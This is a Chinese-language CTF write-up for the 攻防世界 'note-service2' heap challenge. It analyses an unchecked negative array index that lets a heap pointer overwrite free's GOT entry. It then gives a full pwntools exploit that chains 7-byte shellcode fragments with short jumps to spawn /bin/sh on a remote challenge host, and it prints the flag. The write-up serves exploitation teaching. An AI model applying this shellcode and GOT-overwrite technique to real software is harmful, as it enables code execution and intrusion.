---
title: 攻防世界-note-service2
date: 2020-10-01 18:44:22
tags: 
 - PWN
 - CTF
categories: "PWN"
banner_img: /pic/note.jpg
---
# 攻防世界-note-service2

<!-- more -->

## checksec

```shell
[*] '/home/giantbranch/Desktop/pwn/note-service2/note'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

## ida分析

{% asset_img note-ida1.png %}

程序只实现了add和del两个功能。

{% asset_img note-ida2.png %}

add只能申请0x8字节的大小的chunk，但是一个chunk最少要包含fd与bk指针所以其实是数据区是16字节。经过测试写入7字节数据程序正常运行，而写入8字节后程序崩溃。qword_2020A0未对数组边界进行检测，所以可以在任意地址写入堆的地址。

```shell
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x555555554000     0x555555556000 r-xp     2000 0      /home/giantbranch/Desktop/pwn/note-service2/note
    0x555555755000     0x555555756000 r-xp     1000 1000   /home/giantbranch/Desktop/pwn/note-service2/note
    0x555555756000     0x555555757000 rwxp     1000 2000   /home/giantbranch/Desktop/pwn/note-service2/note
    0x555555757000     0x555555778000 rwxp    21000 0      [heap]
    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dcd000     0x7ffff7dd1000 r-xp     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd1000     0x7ffff7dd3000 rwxp     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd3000     0x7ffff7dd7000 rwxp     4000 0      
    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7fdc000     0x7ffff7fdf000 rwxp     3000 0      
    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r-xp     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffd000     0x7ffff7ffe000 rwxp     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffe000     0x7ffff7fff000 rwxp     1000 0      
    0x7ffffffde000     0x7ffffffff000 rwxp    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
```

堆栈都可以执行，但是栈有canary保护，所以在堆中写shellcode。7字节的数据不够将shellcode完整的写入，所以要多次申请chunk将shellcode分散到每个chunk中，最后还要进行跳转。

下面我们分析如何构造堆chunk，因为pwntools无法直接生成jmp short xxx这样的代码，但是我们知道jmp其实就是修改了rip的值，使其加上或减去对应的偏移，我们在源程序中寻找jmp机器码的规律

{% asset_img note-ida3.png %}

找到多个jmp指令

{% asset_img note-ida4.png %}

这些jmp指令的机器码都有EB，可以推断EB代表了jmp，我们知道汇编指令的的参数会在机器码中有所体现，所以我们推断一下偏移量

0xED1-0xE94-0x2=3B

0xED1-0xEA0-0x2=2F

jmp指令本身占两个字节，跳转的偏移是对应地址减去执行jmp后的地址。

{% asset_img note-ida5.png %}

那么我们要的偏移就是0x1+0x8+0x8+0x8=0x19，即EB 19。

下面寻找got与数组的偏移，通过修改got表使程序跳转到shellcode处，

```ida
.got.plt:0000000000202000 _got_plt        segment para public 'DATA' use64
.got.plt:0000000000202000                 assume cs:_got_plt
.got.plt:0000000000202000                 ;org 202000h
.got.plt:0000000000202000                 dq offset stru_201DF8
.got.plt:0000000000202008 qword_202008    dq 0                    ; DATA XREF: sub_880↑r
.got.plt:0000000000202010 qword_202010    dq 0                    ; DATA XREF: sub_880+6↑r
.got.plt:0000000000202018 off_202018      dq offset free          ; DATA XREF: _free↑r
.got.plt:0000000000202020 off_202020      dq offset puts          ; DATA XREF: _puts↑r
.got.plt:0000000000202028 off_202028      dq offset __stack_chk_fail
.got.plt:0000000000202028                                         ; DATA XREF: ___stack_chk_fail↑r
.got.plt:0000000000202030 off_202030      dq offset printf        ; DATA XREF: _printf↑r
.got.plt:0000000000202038 off_202038      dq offset memset        ; DATA XREF: _memset↑r
.got.plt:0000000000202040 off_202040      dq offset read          ; DATA XREF: _read↑r
.got.plt:0000000000202048 off_202048      dq offset __libc_start_main
.got.plt:0000000000202048                                         ; DATA XREF: ___libc_start_main↑r
.got.plt:0000000000202050 off_202050      dq offset malloc        ; DATA XREF: _malloc↑r
.got.plt:0000000000202058 off_202058      dq offset setvbuf       ; DATA XREF: _setvbuf↑r
.got.plt:0000000000202060 off_202060      dq offset atoi          ; DATA XREF: _atoi↑r
.got.plt:0000000000202068 off_202068      dq offset exit          ; DATA XREF: _exit↑r
.got.plt:0000000000202068 _got_plt        ends
.got.plt:0000000000202068
```

0x2020A0-0x202018=0x88，0x88/8=0x11，所以qword_2020A0[-17]处就是free的got表。在我们执行free函数时，会把对应堆的数据区地址传入free作为其第一个参数，也就是说参数的地址会被放入rdi中然后执行got表处对应代码。

选一段较短的**shellcode**

```assembly
mov rdi,&(/bin/sh)
mov rax,0x3b
mov rsi,0
mov rdx,0
syscall
```

但是
```assembly
mov rdi,&(/bin/sh)
```
这个指令所占字节太长了，我们无法直接写入，所以通过修改got表的方式进行传递参数。


## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level="DEBUG"
context.arch="amd64"

p=remote('220.249.52.133',59183)
#p=process('./note')
elf = ELF('./note')

def add(index,content):
	p.sendlineafter("choice>>","1")
	p.sendlineafter("index:",str(index))
	p.sendlineafter("size:","8")
	p.sendlineafter("content:",content)
	sleep(0.5)

def free(index):
	p.sendlineafter("choice>>","4")
	p.sendlineafter("index:",str(index))
	sleep(0.5)

add(0,"/bin/sh")
add(-17,asm("xor rsi,rsi")+"\x90\x90\xeb\x19")
add(1,asm("mov eax, 0x3b")+"\xeb\x19")   #\x90=nop
add(2,asm("xor rdx, rdx")+"\x90\x90\xeb\x19")
add(3,asm("syscall").ljust(7,"\x90"))
free(0)

p.interactive()
```

```assembly
;执行的流程就是，free(0)，将"/bin/sh"的地址传入rdi
;因为修改了got表，所以并未执行原本free的代码
;而是
xor rsi,rsi
nop
nop
jmp short 0x19
mov eax,0x3b
jmp 0x19
xor rdx.rdx
nop
nop
jmp 0x19
nop
syscall
```

## flag

```reStructuredText
cyberpeace{a8dd383d49fa3479e60ef723b5821dcf}
```

## 总结

考察的地方很多，

### 1、汇编指令jmp的原理

观察机器码，可以发现立即数（idata）会在机器码中有所体现。jmp指令机器码中以补码的形式体现。

```assembly
jmp short s			;段内短转移，（ip）=（ip）+8位位移
```

具体参考：[汇编语言（2）](https://niebelungen-d.github.io/2020/10/01/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%EF%BC%882%EF%BC%89/)
### 2、heap
chunk的结构，最小chunk至少包含fd与bk指针，对于32位程序是8字节，64位位16字节。
### 3、参数的传递
64位程序使用寄存器进行传参，进行函数调用时，首先要进行参数的传递。